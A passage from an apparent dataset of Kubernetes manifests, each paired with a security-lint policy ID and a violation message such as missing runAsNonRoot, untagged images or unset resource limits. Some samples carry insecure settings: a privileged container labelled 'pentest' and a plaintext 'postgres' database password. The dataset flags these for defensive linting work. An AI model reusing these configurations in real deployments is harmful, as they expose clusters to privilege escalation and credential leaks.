    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: notion-gtdls\nspec:\n  selector:\n    matchLabels:\n      app: notion-gtdls\n  template:\n    metadata:\n      labels:\n        app: notion-gtdls\n    spec:\n      containers:\n      - name: notion-gtdls\n        image: notion-gtdls\n        envFrom:\n        - secretRef:\n            name: notion-gtdls-env\n        resources:\n          limits:\n            memory: 64Mi\n            cpu: 100m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"notion-gtdls\" does not have a read-only root file system"
  },
  {
    "id": "03595",
    "manifest_path": "data/manifests/the_stack_sample/sample_1587.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: notion-gtdls\nspec:\n  selector:\n    matchLabels:\n      app: notion-gtdls\n  template:\n    metadata:\n      labels:\n        app: notion-gtdls\n    spec:\n      containers:\n      - name: notion-gtdls\n        image: notion-gtdls\n        envFrom:\n        - secretRef:\n            name: notion-gtdls-env\n        resources:\n          limits:\n            memory: 64Mi\n            cpu: 100m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"notion-gtdls\" is not set to runAsNonRoot"
  },
  {
    "id": "03596",
    "manifest_path": "data/manifests/the_stack_sample/sample_1587.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: notion-gtdls\nspec:\n  selector:\n    matchLabels:\n      app: notion-gtdls\n  template:\n    metadata:\n      labels:\n        app: notion-gtdls\n    spec:\n      containers:\n      - name: notion-gtdls\n        image: notion-gtdls\n        envFrom:\n        - secretRef:\n            name: notion-gtdls-env\n        resources:\n          limits:\n            memory: 64Mi\n            cpu: 100m\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"notion-gtdls\" has cpu request 0"
  },
  {
    "id": "03597",
    "manifest_path": "data/manifests/the_stack_sample/sample_1588.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: workflows-controller\n  namespace: workflows-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: workflows-controller\n  template:\n    metadata:\n      labels:\n        app: workflows-controller\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: controller\n        image: ko://github.com/nubank/workflows/cmd/controller\n        resources:\n          requests:\n            cpu: 500m\n            memory: 512Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n        ports:\n        - name: metrics\n          containerPort: 9090\n        env:\n        - name: GITHUB_APP_ID\n          valueFrom:\n            configMapKeyRef:\n              name: config-github-app\n              key: app-id\n        - name: GITHUB_INSTALLATION_ID\n          valueFrom:\n            configMapKeyRef:\n              name: config-github-app\n              key: installation-id\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: workflows.dev/workflows\n        volumeMounts:\n        - name: github-app-private-key\n          mountPath: /var/run/secrets/github\n      volumes:\n      - name: github-app-private-key\n        secret:\n          secretName: github-app-private-key\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"controller\" is using an invalid container image, \"ko://github.com/nubank/workflows/cmd/controller\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03598",
    "manifest_path": "data/manifests/the_stack_sample/sample_1588.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: workflows-controller\n  namespace: workflows-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: workflows-controller\n  template:\n    metadata:\n      labels:\n        app: workflows-controller\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: controller\n        image: ko://github.com/nubank/workflows/cmd/controller\n        resources:\n          requests:\n            cpu: 500m\n            memory: 512Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n        ports:\n        - name: metrics\n          containerPort: 9090\n        env:\n        - name: GITHUB_APP_ID\n          valueFrom:\n            configMapKeyRef:\n              name: config-github-app\n              key: app-id\n        - name: GITHUB_INSTALLATION_ID\n          valueFrom:\n            configMapKeyRef:\n              name: config-github-app\n              key: installation-id\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: workflows.dev/workflows\n        volumeMounts:\n        - name: github-app-private-key\n          mountPath: /var/run/secrets/github\n      volumes:\n      - name: github-app-private-key\n        secret:\n          secretName: github-app-private-key\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"controller\" does not have a read-only root file system"
  },
  {
    "id": "03599",
    "manifest_path": "data/manifests/the_stack_sample/sample_1588.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: workflows-controller\n  namespace: workflows-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: workflows-controller\n  template:\n    metadata:\n      labels:\n        app: workflows-controller\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: controller\n        image: ko://github.com/nubank/workflows/cmd/controller\n        resources:\n          requests:\n            cpu: 500m\n            memory: 512Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n        ports:\n        - name: metrics\n          containerPort: 9090\n        env:\n        - name: GITHUB_APP_ID\n          valueFrom:\n            configMapKeyRef:\n              name: config-github-app\n              key: app-id\n        - name: GITHUB_INSTALLATION_ID\n          valueFrom:\n            configMapKeyRef:\n              name: config-github-app\n              key: installation-id\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: workflows.dev/workflows\n        volumeMounts:\n        - name: github-app-private-key\n          mountPath: /var/run/secrets/github\n      volumes:\n      - name: github-app-private-key\n        secret:\n          secretName: github-app-private-key\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"controller\" is not set to runAsNonRoot"
  },
  {
    "id": "03600",
    "manifest_path": "data/manifests/the_stack_sample/sample_1598.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: default\n  name: contacts1-migration\nspec:\n  initContainers:\n  - name: tmp-container\n    image: contacts1-server:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - cp\n    - -r\n    - /db/migrations\n    - /atlas-migrations\n  containers:\n  - name: migration\n    env:\n    - name: CONFIG_FILE\n      value: defaults\n    image: infoblox/migrate:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - /migrate\n    args:\n    - --verbose\n    - --source\n    - file://atlas-migrations/migrations\n    - --database.address\n    - postgres.default:5432\n    - --database.name\n    - contacts1\n    - --database.user\n    - postgres\n    - --database.password\n    - postgres\n    - up\n  volumes:\n  - name: migrations\n    emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"migration\" is using an invalid container image, \"infoblox/migrate:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03601",
    "manifest_path": "data/manifests/the_stack_sample/sample_1598.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: default\n  name: contacts1-migration\nspec:\n  initContainers:\n  - name: tmp-container\n    image: contacts1-server:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - cp\n    - -r\n    - /db/migrations\n    - /atlas-migrations\n  containers:\n  - name: migration\n    env:\n    - name: CONFIG_FILE\n      value: defaults\n    image: infoblox/migrate:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - /migrate\n    args:\n    - --verbose\n    - --source\n    - file://atlas-migrations/migrations\n    - --database.address\n    - postgres.default:5432\n    - --database.name\n    - contacts1\n    - --database.user\n    - postgres\n    - --database.password\n    - postgres\n    - up\n  volumes:\n  - name: migrations\n    emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"tmp-container\" is using an invalid container image, \"contacts1-server:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03602",
    "manifest_path": "data/manifests/the_stack_sample/sample_1598.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: default\n  name: contacts1-migration\nspec:\n  initContainers:\n  - name: tmp-container\n    image: contacts1-server:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - cp\n    - -r\n    - /db/migrations\n    - /atlas-migrations\n  containers:\n  - name: migration\n    env:\n    - name: CONFIG_FILE\n      value: defaults\n    image: infoblox/migrate:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - /migrate\n    args:\n    - --verbose\n    - --source\n    - file://atlas-migrations/migrations\n    - --database.address\n    - postgres.default:5432\n    - --database.name\n    - contacts1\n    - --database.user\n    - postgres\n    - --database.password\n    - postgres\n    - up\n  volumes:\n  - name: migrations\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"migration\" does not have a read-only root file system"
  },
  {
    "id": "03603",
    "manifest_path": "data/manifests/the_stack_sample/sample_1598.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: default\n  name: contacts1-migration\nspec:\n  initContainers:\n  - name: tmp-container\n    image: contacts1-server:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - cp\n    - -r\n    - /db/migrations\n    - /atlas-migrations\n  containers:\n  - name: migration\n    env:\n    - name: CONFIG_FILE\n      value: defaults\n    image: infoblox/migrate:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - /migrate\n    args:\n    - --verbose\n    - --source\n    - file://atlas-migrations/migrations\n    - --database.address\n    - postgres.default:5432\n    - --database.name\n    - contacts1\n    - --database.user\n    - postgres\n    - --database.password\n    - postgres\n    - up\n  volumes:\n  - name: migrations\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tmp-container\" does not have a read-only root file system"
  },
  {
    "id": "03604",
    "manifest_path": "data/manifests/the_stack_sample/sample_1598.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: default\n  name: contacts1-migration\nspec:\n  initContainers:\n  - name: tmp-container\n    image: contacts1-server:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - cp\n    - -r\n    - /db/migrations\n    - /atlas-migrations\n  containers:\n  - name: migration\n    env:\n    - name: CONFIG_FILE\n      value: defaults\n    image: infoblox/migrate:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - /migrate\n    args:\n    - --verbose\n    - --source\n    - file://atlas-migrations/migrations\n    - --database.address\n    - postgres.default:5432\n    - --database.name\n    - contacts1\n    - --database.user\n    - postgres\n    - --database.password\n    - postgres\n    - up\n  volumes:\n  - name: migrations\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"migration\" is not set to runAsNonRoot"
  },
  {
    "id": "03605",
    "manifest_path": "data/manifests/the_stack_sample/sample_1598.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: default\n  name: contacts1-migration\nspec:\n  initContainers:\n  - name: tmp-container\n    image: contacts1-server:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - cp\n    - -r\n    - /db/migrations\n    - /atlas-migrations\n  containers:\n  - name: migration\n    env:\n    - name: CONFIG_FILE\n      value: defaults\n    image: infoblox/migrate:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - /migrate\n    args:\n    - --verbose\n    - --source\n    - file://atlas-migrations/migrations\n    - --database.address\n    - postgres.default:5432\n    - --database.name\n    - contacts1\n    - --database.user\n    - postgres\n    - --database.password\n    - postgres\n    - up\n  volumes:\n  - name: migrations\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tmp-container\" is not set to runAsNonRoot"
  },
  {
    "id": "03606",
    "manifest_path": "data/manifests/the_stack_sample/sample_1598.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: default\n  name: contacts1-migration\nspec:\n  initContainers:\n  - name: tmp-container\n    image: contacts1-server:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - cp\n    - -r\n    - /db/migrations\n    - /atlas-migrations\n  containers:\n  - name: migration\n    env:\n    - name: CONFIG_FILE\n      value: defaults\n    image: infoblox/migrate:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - /migrate\n    args:\n    - --verbose\n    - --source\n    - file://atlas-migrations/migrations\n    - --database.address\n    - postgres.default:5432\n    - --database.name\n    - contacts1\n    - --database.user\n    - postgres\n    - --database.password\n    - postgres\n    - up\n  volumes:\n  - name: migrations\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"migration\" has cpu request 0"
  },
  {
    "id": "03607",
    "manifest_path": "data/manifests/the_stack_sample/sample_1598.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: default\n  name: contacts1-migration\nspec:\n  initContainers:\n  - name: tmp-container\n    image: contacts1-server:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - cp\n    - -r\n    - /db/migrations\n    - /atlas-migrations\n  containers:\n  - name: migration\n    env:\n    - name: CONFIG_FILE\n      value: defaults\n    image: infoblox/migrate:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - /migrate\n    args:\n    - --verbose\n    - --source\n    - file://atlas-migrations/migrations\n    - --database.address\n    - postgres.default:5432\n    - --database.name\n    - contacts1\n    - --database.user\n    - postgres\n    - --database.password\n    - postgres\n    - up\n  volumes:\n  - name: migrations\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tmp-container\" has cpu request 0"
  },
  {
    "id": "03608",
    "manifest_path": "data/manifests/the_stack_sample/sample_1598.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: default\n  name: contacts1-migration\nspec:\n  initContainers:\n  - name: tmp-container\n    image: contacts1-server:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - cp\n    - -r\n    - /db/migrations\n    - /atlas-migrations\n  containers:\n  - name: migration\n    env:\n    - name: CONFIG_FILE\n      value: defaults\n    image: infoblox/migrate:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - /migrate\n    args:\n    - --verbose\n    - --source\n    - file://atlas-migrations/migrations\n    - --database.address\n    - postgres.default:5432\n    - --database.name\n    - contacts1\n    - --database.user\n    - postgres\n    - --database.password\n    - postgres\n    - up\n  volumes:\n  - name: migrations\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"migration\" has memory limit 0"
  },
  {
    "id": "03609",
    "manifest_path": "data/manifests/the_stack_sample/sample_1598.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: default\n  name: contacts1-migration\nspec:\n  initContainers:\n  - name: tmp-container\n    image: contacts1-server:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - cp\n    - -r\n    - /db/migrations\n    - /atlas-migrations\n  containers:\n  - name: migration\n    env:\n    - name: CONFIG_FILE\n      value: defaults\n    image: infoblox/migrate:latest\n    imagePullPolicy: Always\n    volumeMounts:\n    - mountPath: /atlas-migrations\n      name: migrations\n    command:\n    - /migrate\n    args:\n    - --verbose\n    - --source\n    - file://atlas-migrations/migrations\n    - --database.address\n    - postgres.default:5432\n    - --database.name\n    - contacts1\n    - --database.user\n    - postgres\n    - --database.password\n    - postgres\n    - up\n  volumes:\n  - name: migrations\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tmp-container\" has memory limit 0"
  },
  {
    "id": "03610",
    "manifest_path": "data/manifests/the_stack_sample/sample_1599.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2360\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03611",
    "manifest_path": "data/manifests/the_stack_sample/sample_1599.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2360\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03612",
    "manifest_path": "data/manifests/the_stack_sample/sample_1599.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2360\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03613",
    "manifest_path": "data/manifests/the_stack_sample/sample_1599.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2360\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03614",
    "manifest_path": "data/manifests/the_stack_sample/sample_1599.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2360\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03615",
    "manifest_path": "data/manifests/the_stack_sample/sample_1604.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: priv-exec-replicaset\n  labels:\n    app: pentest\n    type: replicaset\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      type: replicaset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: replicaset\n    spec:\n      containers:\n      - name: priv-exec-replicaset\n        image: ubuntu\n        securityContext:\n          privileged: true\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"priv-exec-replicaset\" is using an invalid container image, \"ubuntu\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03616",
    "manifest_path": "data/manifests/the_stack_sample/sample_1604.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: priv-exec-replicaset\n  labels:\n    app: pentest\n    type: replicaset\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      type: replicaset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: replicaset\n    spec:\n      containers:\n      - name: priv-exec-replicaset\n        image: ubuntu\n        securityContext:\n          privileged: true\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"priv-exec-replicaset\" does not have a read-only root file system"
  },
  {
    "id": "03617",
    "manifest_path": "data/manifests/the_stack_sample/sample_1604.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: priv-exec-replicaset\n  labels:\n    app: pentest\n    type: replicaset\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      type: replicaset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: replicaset\n    spec:\n      containers:\n      - name: priv-exec-replicaset\n        image: ubuntu\n        securityContext:\n          privileged: true\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"priv-exec-replicaset\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "03618",
    "manifest_path": "data/manifests/the_stack_sample/sample_1604.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: priv-exec-replicaset\n  labels:\n    app: pentest\n    type: replicaset\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      type: replicaset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: replicaset\n    spec:\n      containers:\n      - name: priv-exec-replicaset\n        image: ubuntu\n        securityContext:\n          privileged: true\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"priv-exec-replicaset\" is privileged"
  },
  {
    "id": "03619",
    "manifest_path": "data/manifests/the_stack_sample/sample_1604.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: priv-exec-replicaset\n  labels:\n    app: pentest\n    type: replicaset\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      type: replicaset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: replicaset\n    spec:\n      containers:\n      - name: priv-exec-replicaset\n        image: ubuntu\n        securityContext:\n          privileged: true\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"priv-exec-replicaset\" is not set to runAsNonRoot"
  },
  {
    "id": "03620",
    "manifest_path": "data/manifests/the_stack_sample/sample_1604.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: priv-exec-replicaset\n  labels:\n    app: pentest\n    type: replicaset\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      type: replicaset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: replicaset\n    spec:\n      containers:\n      - name: priv-exec-replicaset\n        image: ubuntu\n        securityContext:\n          privileged: true\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"priv-exec-replicaset\" has cpu request 0"
  },
  {
    "id": "03621",
    "manifest_path": "data/manifests/the_stack_sample/sample_1604.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: priv-exec-replicaset\n  labels:\n    app: pentest\n    type: replicaset\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      type: replicaset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: replicaset\n    spec:\n      containers:\n      - name: priv-exec-replicaset\n        image: ubuntu\n        securityContext:\n          privileged: true\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - while true; do sleep 30; done;\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"priv-exec-replicaset\" has memory limit 0"
  },
  {
    "id": "03622",
    "manifest_path": "data/manifests/the_stack_sample/sample_1605.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20220203-c2195422bf\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prow-controller-manager\" does not have a read-only root file system"
  },
  {
    "id": "03623",
    "manifest_path": "data/manifests/the_stack_sample/sample_1605.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20220203-c2195422bf\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prow-controller-manager\" is not set to runAsNonRoot"
  },
  {
    "id": "03624",
    "manifest_path": "data/manifests/the_stack_sample/sample_1605.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20220203-c2195422bf\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
